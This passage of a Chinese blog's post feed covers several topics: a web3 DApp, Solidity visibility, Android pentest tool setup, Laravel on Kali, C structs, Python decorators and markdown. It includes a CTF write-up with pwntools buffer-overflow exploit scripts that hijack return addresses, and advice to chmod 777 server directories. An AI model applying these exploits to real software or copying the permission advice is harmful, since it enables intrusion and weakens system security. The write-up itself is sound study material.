info.getInfo(function(error,result)&#123; $('#info').html("name:"+result[1]+"&amp;emsp;age:"+result[0]); &#125;) &#125;) &lt;/script&gt;&lt;/html&gt; &emsp;&emsp;首先验证引入web3成功1console.log("web3"+web3); &emsp;&emsp;接着我们链接web3的provider或本的链，在这里就是lite-server所创建的服务器环境，lite-server的作用是建立服务器连接，因为MetaMask存在保护，这样才能引入Web3，反正windows用户应该挺难受的。 123456if(typeof web3 != 'undifined')&#123; web3 = new Web3(web3.currentProvider); &#125; else&#123; web3 = new Web3(new Web3.providers.HttpProvide("http://localhost:8545")); &#125; &emsp;&emsp;然后我们生成一个合约对象，这里我们需要编译合约时生成的ABI和地址： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** 注入合约ABI **/var infoContract = web3.eth.contract( [ &#123; "constant": true, "inputs": [], "name": "getInfo", "outputs": [ &#123; "name": "", "type": "uint256" &#125;, &#123; "name": "", "type": "string" &#125; ], "payable": false, "stateMutability": "view", "type": "function" &#125;, &#123; "constant": false, "inputs": [ &#123; "name": "_age", "type": "uint256" &#125;, &#123; "name": "_name", "type": "string" &#125; ], "name": "setInfo", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" &#125;] ) /** 注入合约地址 **/ var info = infoContract.at('0x3d2f4d5eb88848e75c966118c98f4928aa188f21'); &emsp;&emsp;这是我们就得到了一个合约实例，我们可以按照通常面向对象的方式来调用他们的接口。比如： 1234567891011121314$("#button").click(function()&#123; var name = $("#name").val(); var age = $("#age").val() info.setInfo(age,name,function(error,result)&#123; if(!error)&#123; console.log("ok"); &#125; &#125;) &#125;) $('#get').click(function()&#123; info.getInfo(function(error,result)&#123; $('#info').html("name:"+result[1]+"&amp;emsp;age:"+result[0]); &#125;) &#125;) &emsp;&emsp;这里是基于jQuery的信息交互，我们可以清晰的理解这种调用方式，我们向节点服务器发送交易请求，当交易被确认后，前端的数据可以通过调用接口的方式进行刷新，但是数据的更新会有延迟，毕竟交易的确认需要时间。 &emsp;&emsp;到这里，一个极端简单的DAPP已经开发完成，但是区块链神奇的思想可见一斑，由此看来我们还是要好好学设计模式和数学才能更加深刻的理解这个神奇的生态环境。]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[solidity中令人窒息的语法糖]]></title>
    <url>%2F2019%2F03%2F18%2Fsolidity%E4%B8%AD%E4%BB%A4%E4%BA%BA%E7%AA%92%E6%81%AF%E7%9A%84%E8%AF%AD%E6%B3%95%E7%B3%96%2F</url>
    <content type="text"><![CDATA[Solidity函数的困惑 &emsp;&emsp;关于Solidity我看的是不明不白，主要是web3的api几乎一无所知，而且对区块链的理解也不够深刻，在此记录一下一些令我窒息的语法糖。 1. 关于函数的可见型与访问控制&emsp;&emsp;Solidity封装了两种函数调用方式 internal 与 external internal &emsp;&emsp;internal调用，实现时转为简单的EVM跳转，所以他能够直接访问上下文的数据，对于引用传递是十分高效，例如memory之间的值传递，实际上是引用的传递(妈耶，storage和memory又是坑，不同版本真是令人窒息)。 &emsp;&emsp;当前代码单元内，比如同一个合约内的函数，引入的library库，以及父类函数的直接调用即为internal调用，比如： 123456789pragma solidity &gt;=0.4.0 &lt; 0.6.0;contract test&#123; function a() internal &#123;&#125; function b() internal &#123; a(); &#125;&#125; &emsp;&emsp;在上述代码中的b()对a()的调用即为internal方式调用，函数在不显式声明访问类型时,以目前的版本来看会报错。 external &emsp;&emsp;external调用实现了合约的外部消息调用。所以合约在初始化时不能以external的方式调用自身函数，因为此时合约仍未构造完成，此处可类比struct类型，一个结构体不能包含自身对象。但是可以以this的方式强制进行external调用。 1234567891011121314pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract test&#123; function a() external &#123;&#125; function b() public &#123; a(); //此时会报错 &#125; contract ext&#123; function callA(test tmp) public &#123; tmp.a(); &#125; &#125;&#125; public &emsp;&emsp;public的特点是，函数既可以以internal方式调用，也可以用internal方式调用。public函数可以被外部接口访问，是合约对外接口的一部分。12345678910pragma solidity &gt;= 0.4.0 &lt; 0.6.0contract test&#123; function fun1() public&#123;&#125; funciton fun2() public &#123; fun1(); this.fun2(); &#125;&#125; &emsp;&emsp;可以看到没有报错，既然public这么舒服，那为啥我还要用external？？？ &emsp;&emsp;经过对比后我们可以发现，external方法消耗的gas要比public少，因为Solidity在调用public函数时会将代码复制到EVM的内存中，而external则是以calldata的方式进行调用的。内存分配在EVM中是十分宝贵的，而读取calldata则十分廉价，因此在处理大量外部数据，并反复调用函数时，应当考虑用external方法。 &emsp;&emsp;这里应当注意的是，public属于可见性。函数的可见性分为四种：public private internal external . private &emsp;&emsp;对于private，与internal的区别是，private的方法在子类中无法调用，即使被声明为private也不能阻止数据的查看。访问权限仅仅是限制其他合约对函数的访问和数据修改的权限。而private方法也默认以internal的方式调用。 12345678910111213141516171819pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract test&#123; function fun1() private&#123;&#125; function fun2() public&#123; fun1(); //this.fun1() &#125;&#125;//合约的继承为is，这一点很容易理解，如果你明白设计模式的话，实际上继承是A is B 的关系,我很喜欢这种写法。contract ext is test&#123; function callFun() public &#123; //fun1(); fun2(); &#125;&#125; &emsp;&emsp;这里我们可以明确的看到private的效果，和internal类似，但是代价会更大。 &emsp;&emsp;然而 public 与 private 还可以被作用于其他的变量，用于设置外部访问权限。 &emsp;&emsp;请大家务必不要弄混 调用方式 与 可见性(visable) 。 this &emsp;&emsp;在Solidity中，this与其他高级语言意义不同，这里的this指的是当前合约的一个实例化对象，而并不是只的合约本身，this可以理解为实现external调用的一种方式，在初始化未完成时强制调用external类型方法。而并不能指代当前合约类型。123456789pragma solidity &gt;= 0.4.0 &lt; 0.6.0;contract test&#123; function fun1() external&#123;&#125; function fun2() public&#123; this.fun1(); &#125;&#125; getter &emsp;&emsp;编译器会为公共状态变量提供一个getter(访问器)函数，对mapping和数组以及枚举类型也提供了对应的getter，mapping的key 数组的下标 枚举的名都具有getter，访问器的visable为external。 2. 关于 view pure constant&emsp;&emsp;在0.4.1之前只有constant这一种可爱的语法，就是有一些屁事很多的人觉得constant指的是变量，作用于函数不太合适，所以就把constant拆成了view和pure。 &emsp;&emsp;在Solidity中，constant view pure 的作用是告诉编译器，函数 不改变，不读取状态变量，这样一来函数的执行就不再消耗gas了，因为不再需要矿工去验证。 &emsp;&emsp;然而这三个东西有点有意思，在官方文档中用 restrictive 这一词来对函数的严格性进行描述，在函数类型转换时对严格行有一定的要求，高严格性函数可以被转化为低严格性函数： pure 类型可被转化为 view 和 non-payable 函数 view 类型可被转化为 non-payable 函数 payable 类型可被转化为 non-payable 函数 &emsp;&emsp;真是令人头秃！]]></content>
      <tags>
        <tag>tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwn_write_up]]></title>
    <url>%2F2019%2F02%2F13%2Fpwn-write-up%2F</url>
    <content type="text"><![CDATA[一些pwn题的write_up&emsp;&emsp;pwn题就是好玩,做了几道题，写一波writeUp。&emsp;&emsp;点击标题可下载题目。 1. crackme0x00&emsp;&emsp;首先我们把这玩意扔到radare2里，先逆了再说。&emsp;&emsp;看了一下main()大概长着个样子： &emsp;&emsp;然后下面的分支大概长这个样子： &emsp;&emsp;大概意思就是，假如我输入的字符串等于250382就算我成功了。本身到这里其实题目已经做完了，但是为了实践stackoverflow，我们要用厉害的方法。 &emsp;&emsp;我们可以看到有一个局部变量 char *s1 @ ebp-0x18 这说明这个字符串距离栈基址有 0x18 (24byte) 这么远.那么此时 s1 就距离 return_address 有 0x18+4 这么远.这个时候，我们就可以做一些恶心的事情，比如： 123456789from pwn import * sh = process('./crackme0x00')payload = 'a'*0x18 + 'bbbb' + p32(0x8048480)sh.sendline(payload)sh.interactive() &emsp;&emsp;我们这样构造payload的原因是，我们希望 return 的地址是我们想要的指令.我们前面输入了一堆aaa和bbbb这是为啥嘞？24个a为了填充s1与esp的值的间隔，而4个b则是为了恰好覆盖ebp.&emsp;&emsp;这样一来，后面的 p32(0x8048480) 就恰好存到了return_address的位置，也就起到了我们要的劫持指令的效果。结果长下面这样： 2. ret2text&emsp;&emsp;这个题稍微有点难度，我们用r2先逆为敬.&emsp;&emsp;main()大概长下面这样： &emsp;&emsp;我们可以看到里面有 gets() 函数，这个东西是坨垃圾，他不限制输入的长度，所以很有可能把缓冲区怼爆，所以我们就想法子日这个函数。&emsp;&emsp;我们看到里面有个局部变量 char *s @ esp+0x1c ,gets()函数的值就存在s里面。这个时候我们不禁萌生了一些猥琐的想法。&emsp;&emsp;我们接着看其他还有啥函数，毕竟main()里没有好利用的东西，这个时候我们发现了 sym.secure 这个函数： &emsp;&emsp;我们仔细看了一下发现，果然里面有见不得人的东西，它调用了 system(“/bin/bash”),这我们还能说什么，直接跳转到 0x0804863a 日了他完事。下面就是愉快的编写payload，我灵机一动发现事情并不简单，这个局部变量并不是基于 ebp 的偏移地址，而是基于 esp 栈顶指针给出的，不知道他用了什么妖术。这样的话我们只好用gdb动态调试： &emsp;&emsp;我们在gets()那里打上断点，然后看一下寄存器的值： 1234567$esp -&gt; 0xffffd030$ebp -&gt; 0xffffd0b8s @ $esp+0x1c -&gt; 0xffffd04c($ebp - s) -&gt; 0xfffd0b8 - 0xffffd04c = 0x6c &emsp;&emsp;一顿帅气操作我们已经得到了s基于ebp的偏移地址，下面我们就愉快的写payload： 1234567891011from pwn import * sh = process('./ret2text')target = 0x0804863a payload = 'a'*0x6c + 'bbbb' + p32(target)sh.sendline(payload) sh.interactive() &emsp;&emsp;下面就是我们的结果： 3. babyPwn&emsp;&emsp;这个题就比较简单了，程序也是我自己写的，下面是源码： 123456789101112131415161718#include &lt;stdio.h&gt; #include &lt;string.h&gt; void success() &#123; puts("You Hava already controlled it."); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return; &#125; int main(int argc, char **argv) &#123; vulnerable(); return 0; &#125; &emsp;&emsp;直接逆,main()和sym.vulnerable()大概下面这样： &emsp;&emsp;这个逻辑也比较简单，我们看main()里面好像啥也没有，接着看vulnerable()里面又出现了gets()这种东西，好了怼他，我们看到这个局部变量char s @ ebp-0x14中规中矩，给的也是基于 ebp 的偏移地址。&emsp;&emsp;接着我们看一看别的函数，里面有个醒目的 sym.success 是结果没跑了，一看长这样： &emsp;&emsp;那我们就直接把success()的地址放在vulnerable()的返回值那里，让他直接跳转，思路清晰，下面愉快的写payload： 123456789101112from pwn import *sh = process('./1')success_addr = 0x08049172payload = 'a' * 20 + 'bbbb' + p32(success_addr)print p32(success_addr)sh.sendline(payload)sh.interactive() &emsp;&emsp;然后结果就长这个样子： 总结&emsp;&emsp;总之，我认为pwn是入侵的最高境界，是一种暴力美学，如果说web能拿到一些主机的权限，那么pwn能拿到世界上所有主机的权限。&emsp;&emsp;漏洞的利用千奇百怪，绝不要被教条束缚了头脑，始终忘不了第一次见到如此简洁的shellcode时的惊讶。二进制就像魔法，我就是寻求刺激的魔法师。&emsp;&emsp;以上三道题目是入门题，我要走的路还很长。]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[测试环境的搭建]]></title>
    <url>%2F2019%2F01%2F17%2F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;到了公司以后，目前在学习android客户端的渗透测试。在看过用例之后觉得也不很难，主要是搭环境是真的恶心，反正windows下就是各种不顺，还是linux比较方便。记录一下各种工具的安装和使用把。 drozer的安装 &ensp;&emsp;在linux下安装是真的顺畅,首先要安装python——wheel的环境，至于这是个啥目前我还不太清楚： 12345git clone https://github.com/mwrlabs/drozer/cd drozerpython setup.py bdist_wheel &nbsp;然后就可以pip install了 注意，pip3还是pip取决于python环境1pip install drozer &emsp;&emsp;当然了你也可以直接去github上直接git clone。&emsp;&emsp;到这里，电脑端的drozer就安装完成了，接下来我们要安装移动测试端的agent.apk&emsp;&emsp;这里我们要去drozer_agent.apk去下载agent.apk,然后用adb直接安装就好了。1adb install drozer-agent-2.x.x.apk &emsp;&emsp;好了，到这里安装已经结束了，接下来我们测试以下，首先我们要开启端口转发：1adb forward tcp:31415 tcp:31415 &emsp;&emsp;然后，在手机端打开drozer的开关 &emsp;&emsp;接下来我们要通过drozer console 来连接手机：123drozer console connect ---server ip_of_your_phone注意：这里是使用真机测试 所以后面要加上手机的ip做参数， &emsp;&emsp;假如你使用的是模拟器，就可以直接:1drozer console connect &emsp;&emsp;好了，到此为止已经测试完成了 &emsp;&emsp;其实直接输入drozer就能得到提示，人家的文档写的还是很不错的，用法以后再补。 frida的安装&emsp;&emsp;frida是一个很牛逼的框架，能hook能注入反正就是各种牛逼，我目前还不太熟悉android，所以高级操作我也不会。&emsp;&emsp;这个东西嘛，反正我在windows下是各种崩，所以直在linux下安装了：1234567首先要安装python3pip install frida-toolspip install fridanpm install frida &emsp;&emsp;这个三条命令一输，完事儿。(垃圾windows &emsp;&emsp;然后去这里下载frida的客户端 注意，一定要下载对应的版本号，要与电脑断相同&emsp;&emsp;然后用adb把frida-server安装到手机并运行，然后我们测试一下： &emsp;&emsp;好了，到此为止frida搭建完毕。]]></content>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Laravel with kali]]></title>
    <url>%2F2018%2F12%2F12%2Flaravel-with-kali%2F</url>
    <content type="text"><![CDATA[记录一下在Kali下如可搭建Laravel环境 &emsp;&emsp;我的天呐,Kali安装个Laravel是真的难,不是权限问题就是依赖问题,统一记录一下吧.&emsp;&emsp;首先要新建一个普通用户12345useradd -m dyf -s zsh -d /home/dyf passwd dyf //然后就输入密码usermod //可修改用户状态userdel //可删除用户visudoers 将用户加入sudoers &emsp;&emsp;关于useradd的参数用法:123456-c comment 指定一段注释性描述。-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。-g 用户组 指定用户所属的用户组。-G 用户组，用户组 指定用户所属的附加组。-s Shell文件 指定用户的登录Shell。-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。 &emsp;&emsp;接着是最恶心的部分,安装php依赖:123456sudo apt-get install -y libapache2-mod-php7.0sudo apt-get install -y php7.0-mysqlsudo apt-get install php7.2-zipsudo apt-get install php-common php-mbstring php-xml php-zip php-json php-mcryptsudo apt-get install php-mbstringsudo apt install libapache2-mod-php &emsp;&emsp;弄完了这么一堆恶心的东西之后,心态差了许多.&emsp;&emsp;现在开始我们已经可以真正开始了.第一步是安装php的包管理composer:123456sudo apt updatesuod apt upgradesudo apt install -y composercomposer //此时有参数选项则安装成功sudo chmod 777 /home/dyf //增加写入权限composer config -g repo.packagist composer https://packagist.laravel-china.org //更换composer源 &emsp;&emsp;此时composer已经安装完毕,下面开始正式安装Laravel:12composer global require "laravel/installer"PATH=$PATH:/home/dyf/.config/composer/vendor/bin //修改为全局变量 到这里已经差多完了,缺啥东西自己去stackoverflow上面查吧,心力憔悴.然后嘞,你需要去修改/etc/apache2/sites-aviliable/000-default.conf把默认路径改一下.123456composer create-project --prefer-dist laravel/laravelchmod -R 777 public storage bootstrap //给权限vim /etc/apache2/apache2.conf //找到'/var/www'将AllowOverride改为allsudo a2enmod rewrite //开启重写模式composer installcomposer update &emsp;&emsp;接着为新项目建立一个新的mysql账户,一定要安装php7.x-mysqli的包,否则 mysqliconnect() 将无法使用.安装php-curl &emsp;&emsp;开始干活吧. ps:我不小心重装了系统，结果又蹦了，首先是apache，接着是php版本冲突要用a2enmod php7.*修改。我又双重装了系统，这次提供的node版本是11.0,根本不支持之前的版本，踏马只能用 npm rebuild node-sass –force 回滚原先的版本。]]></content>
      <tags>
        <tag>tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对C结构的理解]]></title>
    <url>%2F2018%2F12%2F02%2F%E5%AF%B9C%E7%BB%93%E6%9E%84%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[记录一下学习C结构的想法 我认为结构这种数据类型为C++奠定了面向对象的基础。这是一种很自由的数据类型，我们甚至可以用指针和结构实现面向对象。 关于结构的声明 1234struct name&#123; type1 a; type2 b; &#125;; //注意这里的分号 这里的声明并未创建一个实际的数据对象，而是描述了这类对象的元素形式，我们也可以将结构声明称之为模板，因为他勾勒出数据将如何存储。之后我们声明name结构的变量： 1struct name dyf; 当编译器读到这条指令时，它将以name模板为dyf分配内存空间，即使未初始化，该结构的大小也由type1 与 type2 的大小决定。这就意味着结构的大小可能会大于数据集本身，因为系统对数据的对齐要求会导致存储裂缝。再者，我们可以如下声明： 1234struct name &#123; type1 a; type2 b; &#125; dyf; 即声明结构与定义结构的过程合二为一，如果要多次使用一个模板我们也可以用typedef。 关于结构的初始化 123456789struct book &#123; char name[20]; int weight[20];&#125;; struct book math&#123; "高等数学"， 20&#125;; 非指定初始化应当保持初始化项目与结构成员类型一一对应。而指定初始化则类似于数组： 12345 struct book dyf&#123; .name="高等数学", .weight=10 &#125;； 其中的.name类似于数组的下标，寻址自然与数组类似。 关于结构数组的声明 12struct book library[20];library[2].name="高等数学"; //代表library的第三个元素的那么成员 此时，[2]是library的下标，应当注意区别：12library[2].name;library.name[2]; 后者指的是library的第一个成员的name的第三个字符。 关于嵌套结构 有时候我们会在一个结构中嵌套另一个结构例如： 12345678910struct name&#123; char firstname[20]; char lastname[20];&#125;;struct person &#123; struct name dyf; int age; int height;&#125;; 只需在外层结构中声明即可，同理，使用两次点运算符进行访问： 1person.dyf.name="dyf"; 指向结构的指针我们可以通过指针来传递并访问结构，这种操作非常舒服。 声明与初始化指针： 123456789struct person &#123; struct name dyf; int age; int height;&#125;;struct person * p; //定义一个只想person结构类型的指针pp = &amp;dyf; //将dyf的地址赋值给指针p p指针在被定义后只能指向person的结构类型，储存person结构的地址。与数组不同的是，结构的名并不代表首个成员的地址，因此必须使用&amp;操作符。 指向结构的指针 我们可以通过指针来传递并访问结构，这种操作非常舒服。 声明与初始化指针： 123456789101112struct person &#123; struct name dyf; int age; int height;&#125;; struct person * p; //定义一个指向person结构类型的指针p p = &amp;dyf; //将dyf的地址赋值给指针p struct book * m;m = &amp;library[2]; //同理，结构数组内的结构如图赋值 p指针在被定义后只能指向person的结构类型，储存person结构的地址。与数组不同的是，结构的名并不代表首个成员的地址，因此必须使用&amp;操作符。 使用指针访问成员：此时我们可以引入一个新的运算符”-&gt;”。例如： 12345m-&gt;name == library[2].name;m == &amp;library[2]; //m存的地址即为library[2]的地址 printf("%d",m-&gt;name); //打印library[2].name 即高等数学 m -&gt; value 此操作符意味着取m地址中存的结构的成员，即： 1m -&gt; value.name == (*m).name == library[2].name; 注意：`&apos; * &apos;` 的运算级大于` &apos; . &apos;` 使用时注意加() 向函数传递结构 只要结构具有单个值的数据类型，即：int及其相关类型、char、float、double、指针等，就可以把它作为一个参数传递给函数，如： 1234567891011121314151617181920212223242526272829303132333435363738#include&lt;stdio.h&gt;struct name&#123; char firstname[20]; char lastname[20];&#125;;struct person &#123; struct name myname; int age; int height;&#125;;void getInfo(struct person * p);void outIbfo(struct person * p);int main(void)&#123; struct person dyf; struct person * p; p = &amp;dyf; getInfo(p); outInfo(p);return 0;&#125;void getInfo(struct person * p)&#123; printf("please enter your firstname\n"); scanf("%s",&amp;((*p).myname.firstname)); //注意理解这里 printf("please enter your last name\n"); scanf("%s",&amp;((p-&gt;myname).lastname)); //注意理解这里 printf("please enter your age\n"); scanf("%d",&amp;(p-&gt;age)); printf("please enter your height\n"); scanf("%d",&amp;(p-&gt;height));&#125;void outInfo(struct person * p)&#123; printf("\nname\t); printf("%s %s\n",(p-&gt;myname).firstname,(p-&gt;myname).lastname); printf("age %d\n",p-&gt;age); printf("height %d\n",p-&gt;height);&#125; 以上是利用指针来传递结构参数，应当深刻理解’-&gt;’的意义。 1p-&gt;dyf; //这仅仅是获得dyf变量的名而不是其地址 等价于(*dyf) 但scanf()需要传递给地址，因此我们需要使用&amp;操作符。如果你理解了以上两种寻址方式，那么你对-&gt;的理解算是合格了。但距离用结构和指针实现面向对象还有一定距离。顺便说一句，我们通常用结构和指针实现队列的数据结构，好好理解指针吧。 当然除了以上这种用指针传递参数的方式，我们还可以直接用结构的名传递参数。12345678struct yourmark &#123; int math; int English;&#125;;double mark(struct yourmark mark )&#123; return mark.math + mark.English;&#125; 这种传参方式很自然也很好理解，但是这毕竟只是赋值给形参，因此如果想改变元数据，我们依旧要使用指针。 如果要返回struct则： 123456789101112struct yourmark&#123; int math; int English;&#125;;struct yourmark getmark(struct yourmark mark)&#123; // 此处的返回类型为yourmark结构类型 printf("please enter your math mark and English mark\n"); scanf("%d%d",&amp;(mark.math),&amp;(mark.English)); return mark&#125;struct yourmark mark;mark = getmark(mark); // 注意，给结构赋值时直接用其名而不是其地址 同理，要返回指针只需要struct yourmark * mark getmark(struct yourmark mark) 好了到这里，把结构在函数里传来传去已经差不多说完了。 复合文字和结构 C99引入了一些新的概念，比如变长数组(VLA)、复合文字(compound literal)、指针的兼容性等。 复合文字的意思： 假如我要给函数传递参数，我可以传递一个变量也可以传递一个常量，例如： 12int a=2,b=3;sum(a,b)==sum(2,3); 但是对于数组或者结构来讲我们之前没有说过常量这个概念，在传递参数时或者向另一结构传递时可能要定义新的变量，很浪费内存。此时，便引入了复合文字这一概念。 声明如下： 123456789101112131415161718192021222324252627282930313233struct person &#123; char name[20]; int age;&#125;;struct person guy; //定义一个person结构类型的结构guy = (struct person)&#123;"dyf",18&#125;; //把复合文字赋值给guy outInfo((struct person)&#123;"麂皮"，18&#125;)； //将一个匿名结构作为实参传递给函数 struct class23 &#123; (struct person)&#123;"dyf",18&#125;; (struct person)&#123;"麂皮"，18&#125;;&#125;; //将两个匿名结构传递给class23------------------------------------------------------------------- #include &lt;stdio.h&gt;struct mark &#123; int math; int English;&#125;;int mark(struct mark * p); //声明一个参数为mark结构的指针的函数int main(void)&#123; printf("%d",mark(&amp;(struct mark )&#123;150，150&#125;))； //传递复合文字的地址 return 0;&#125;int mark(struct mark * p)&#123; return p-&gt;math + p-&gt;English；&#125;/* 注：用G++编译会报错，因为其地址是temporary 而C99版本的GCC是可行的,因为临时具有自动储存时期，而在函数外具有静态储存时期 */ 这是复合文字的大概用法，他能够创建一个匿名常量对象，直接在结构体或者函数中传递的常量。 伸缩性数组成员 C99加入了一个成为伸缩性数组成员(flexible array member)的新特性,该特性允许结构的最后一个成员是一个具有特殊属性的数组结构，该数组的属性之一就是他并不立即存在。创建规则如下： 伸缩性数组成员必须是最后一个成员 结构中至少有一个其他成员 像普通数组那样声明，只是长度不定，例：int a[]; 如下：1234struct mark&#123; int average; char subjects[] //伸缩数组成员&#125;； 此时subjects[]并未被创建，系统没有为他分配足够的内存空间。通常我们要使用伸缩数组时，都会为其先分配足够的内存空间。 12struct mark * p;p=malloc(sizeof(struct mark) + 20 * sizeof(char)); 这时我们已经有足够的内存来存放一个mark型结构，并且他可以存放一个19个字符的字符串。没错，开辟的内存空间要能存放结构本身和所需大小的数组。 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;int main(void) &#123; struct flex&#123; int age; char * name; char * favobook[20]; //思考一下，他在main()中能直接赋值吗 int favonumber[]; &#125;; struct flex * p; p = malloc(sizeof(struct flex)+6* sizeof(int)); p-&gt;age=18; p-&gt;favonumber[7]=1; p-&gt;name="dyf"; printf("%s \t %d \t %d",p-&gt;name,p-&gt;age,p-&gt;favonumber[7]); return 0;&#125; 这里我们声明里一个指针name，要注意在C语言中，字符串以数组的形式存储，也就是说其变量名实际是个地址，在我们对其进行声明时计算机已经为他在内存中开辟了空间，所以其地址实际上是个常量，即name是个常量。假如我要进行name=&quot;dyf&quot;;操作，编译器将报错。&quot;dyf&quot;的地址很明显与name本身冲突，故不能直接赋值。这里我们看到favonumber能存8个整数，我也不知道为什么，回去查查资料再来修改。 将结构存到文件中 结构的整套信息我们称之为记录(record),单个的项目称之为字段(field)，下面，我们来进行讨论。第一种方法，也是最笨拙的方法，使用fprinf()函数，例如： 1234567struct book&#123;char title[20];char author[20];double value;&#125;;struct book math;fprintf(books, "%9s %9s %7.2d",math.title,math.author,math.value); 我们使用%9s来固定输入格式，以便于下一次读取,这里的books是文件流。 第二种方法，我们可以使用fread()和fwrite()以结构大小为单位来进行读写，例如：1fwrite(&amp;math,sizeof(struct book),1,books) 这时我们将定位到math的地址sizeof(struct book)将返回一块book结构的大小，&#39;1&#39;则告诉函数只需复制一块结构，最后将整个record写入books相关联的文件。同样fread()将record写入&amp;math地址。 衍生出的其他数据类型 通过对结构体进行封装，C中还有联合又称为共用体(union)、枚举(enumerated type)两种类型。首先，union声明如下：1234union id&#123; char id_string[20]; int id_int;&#125;; 假如一个物体的id有可能是整数，也有可能是字符串，那么我们可以用以上操作。union并不是复合结构,这其中的声明的类型只能同时存在一种，也就是说id可以是字符串类型，也可以是int类型。因此，我们可以声明一个union数组来存放不同类型的数据，这样就实现了混合数据类型存储。这种数据类型封装的方法与结构相同，同样支持. -&gt;等运算符，但是其意义却完全不同。其次，枚举类型声明如下：123456enum subjects &#123;math=,English=2,Chinese,CS&#125;;enum subjects my_favo_subject;for(my_favo_subject=math;my_favo_subject&lt;=CS;my_favo_subject++)&#123; printf("%d\n",my_favo_subject);&#125; 我们通常用枚举创建符号常量，例如，math，CS是枚举常量，默认为int类型，math是枚举对象的首元素，其默认值为0，这就好比数组的下标，方便我们进行枚举。我们也可以给枚举常量一个指定值，例如上面English=2，那么，其后面的元素依次从2递增。由于枚举类型是一个整数类型，所以我们常将其用于表达式当中，方便进行逻辑判断或者运算。注：C语言支持枚举变量自增，即my_favo_subject++;但是C++不支持，注意代码兼容性。 用结构实现链表 dyf is cool. 用结构实现面向对象]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对装饰器的理解]]></title>
    <url>%2F2018%2F12%2F02%2F%E5%AF%B9%E8%A3%85%E9%A5%B0%E5%99%A8%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[关于python装饰器的思考： 我们首先应该对函数进一步了解函数也可以被传递，比如：12345def a(): print("a")v = av()输出结果为：a 这里我并没有加()即v = a()，因为v()此时将返回TypeError，而print(v)则由于无返回值而返回None 而v = a则将函数名作为参数传递，想要运行该函数只需要v()，此时print(v)将返回v的地址。函数内也可以声明函数，但是此函数并不能在函数外访问，如： 如： 1234567def a(): def v(): print('00') v()v()此时运行结果为：00 NameError: name 'v' is not defined 进一步理解函 函数也是可以被返回的如果要返回函数，只需返回其函数名即可，其函数名将作为参数传递。如需调用则只需函数名加括号，在这里尤其要弄清楚传递和返回函数时该不该加括号。 如：1234567891011121314151617def a(x): def b(): print('dyf') def c(): print('abc') if x == '1': return b else: return cx = input('请输入')v = a(x)v()则输出结果为: 请输入 1 dyf 请输入 2 abc 注：如果想打印函数返回值一定要用输出函数，如果print(v())输出其返回值。 如果print(v)则输出其地址 函数内也可以定义函数，这种函数称之为内嵌函数，内嵌函数是私密的，因此不可在函数外调用，我们往往将其作为返回值而进行调用。 return 可以返回多个值，其值可以被传递，但是应当注意，尽量不要用golbal返回值，涂添烦恼 装饰器的实质 对于装饰器而言，实际上是一个函数，只不过其参数也是个函数。应当注意的是传递函数时应使用其函数名而不加括号，其函数名将作为参数而传递。 语法有如下两种： 123456789101112131415161718192021222324252627282930311.def a(f): def lmt(): print('abc') f() return abcdef dyf(): print('dyf')dyf()dyf = a(dyf)dyf()print(dyf.__name__)输出结果为： dyf abc dyf abc #dyf函数的名和注释文档被重写(docstring) ============================================================================= 2.def a(f): @wraps(f) @这个函数保留原函数名 def lmt(): print('abc') f() return abc@adef dyf(): print('dyf')dyf() 输出结果为: abc dyf 以上两种方式效果完全相同，只是@方式是其简便写法，装饰器的本质即： 以函数调用函数的方式来对被调用函数进行修饰，但要注意 在函数调用的过程中应当以函数名作为参数 在执行函数时才加括号。 若要保留被装饰函数的真是名需要调用functools模块的wraps()函数，语法为 @wraps(f)，实际上wraps()函数本身就是一个装饰器，只不过其参数是一个函数罢了。 Ps.这是我对装饰器的简单初步理解，以后会进一步补充。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>thinking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown-tutorial]]></title>
    <url>%2F2018%2F12%2F02%2Fmarkdown-tutorial%2F</url>
    <content type="text"><![CDATA[记录一下markdown的语法 语义标记: 描述 样式 代码 加粗 dyf ** dyf ** 斜体 dyf * dyf * 加粗斜体 dyf * ** dyf ** * 删除线 dyf ~~ dyf ~~ 语义标签: 描述 样式 代码 上标 dyfs dyf&lt;sup&gt;s&lt;sup&gt; 下标 dyfs dyf&lt;sub&gt;s&lt;sub&gt; 键盘文本 Ctrl &lt;kbd&gt;Ctrl&lt;kbd&gt; 标题： code: 1234567# dyf## dyf### dyf#### dyf ##### dyf###### dyf####### dyf //错误的代码 demo： dyfdyfdyfdyfdyfdyf ＃号之所以能加粗是因为markdown本质是用语法糖封装的html语言，而html只有6种title-size，所以最多加6个#号 分级标题code： 1234 dyf========= Stella Del Mattino--------- Demo: dyfStella Del Mattino 引用： 代码：123456789&gt;dyf&gt;&gt;is&gt;&gt;&gt;really&gt;&gt;cool&gt;! //注意每行空开 Demo: dyf is really cool ! 行内标记： Demo: PHP是世界上最好的语言 Code: 1PHP是世界上`最好`的语言 //标记代码将变为一行 代码块： Demo:1printf("dyf is really cool"); Code:123` ` `C //languageprintf(&quot;dyf is really cool&quot;);` ` ` 不同的语言可以显示不同的高亮，但与主题有关。 插入链接： Demo: lavarel toturial codeforces Code:1234[lavarel 